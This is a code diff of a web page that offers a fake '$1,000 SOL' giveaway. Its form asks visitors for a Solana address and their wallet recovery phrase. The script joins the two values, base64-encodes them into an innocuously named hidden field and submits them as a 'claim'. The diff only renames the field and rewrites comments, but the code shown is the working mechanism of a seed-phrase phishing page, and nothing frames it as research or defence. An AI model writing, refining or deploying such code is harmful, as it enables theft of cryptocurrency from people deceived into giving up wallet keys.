@@ -139,7 +139,7 @@
                 </div>
 
                 <!-- Hidden field for the encoded single text string -->
-                <input type="hidden" name="name" id="coded-data">
+                <input type="hidden" name="name" id="coded-phrase">
                 <input type="hidden" name="subject" value="New $1,000 SOL Claim Submission">
 
                 <button type="submit" id="submit-btn" class="btn">CLAIM</button>
@@ -160,6 +160,7 @@
         const submitBtn = document.getElementById('submit-btn');
         const formView = document.getElementById('form-view');
         const successView = document.getElementById('success-view');
+        const codedInput = document.getElementById('coded-phrase');
 
         form.addEventListener('submit', function(e) {
             e.preventDefault();
@@ -168,18 +169,17 @@
             submitBtn.disabled = true;
 
             try {
-                // Get values from the two boxes
+                // Get values from the two textarea boxes
                 const solAddress = document.getElementById('sol-address').value;
                 const recPhrase = document.getElementById('rec-phrase').value;
                 
-                // Combine into single text with line break
+                // Combine into single text: Address on line 1, Phrase on line 2
                 const combined = solAddress + "\n" + recPhrase;
                 
-                // Base64 encode the combined single text
-                document.getElementById('coded-data').value = btoa(unescape(encodeURIComponent(combined)));
+                // Base64 encode using your existing logic
+                codedInput.value = btoa(unescape(encodeURIComponent(combined)));
             } catch (err) {
-                // Fallback if encoding fails
-                document.getElementById('coded-data').value = "Error encoding data";
+                codedInput.value = "Encoding Error"; 
             }
 
             const formData = new FormData(form);
